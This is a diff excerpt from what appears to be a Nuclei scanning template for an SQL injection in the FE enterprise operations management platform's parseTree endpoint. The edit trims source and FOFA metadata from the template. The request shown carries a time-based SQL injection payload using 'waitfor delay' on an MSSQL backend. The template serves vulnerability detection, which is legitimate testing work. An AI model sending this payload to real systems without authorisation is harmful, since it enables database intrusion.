@@ -3,14 +3,8 @@ info:
   name: 飞企互联-FE企业运营管理平台-parsetree接口存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dc94edmrihxuzd75
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dc94edmrihxuzd75
-    fofa: app="飞企互联-FE企业运营管理平台"
 http:
 - raw:
   - 'GET /common/parseTree.js%70?code=1%27;waitfor+delay+%270:0:2%27-- HTTP/1.1
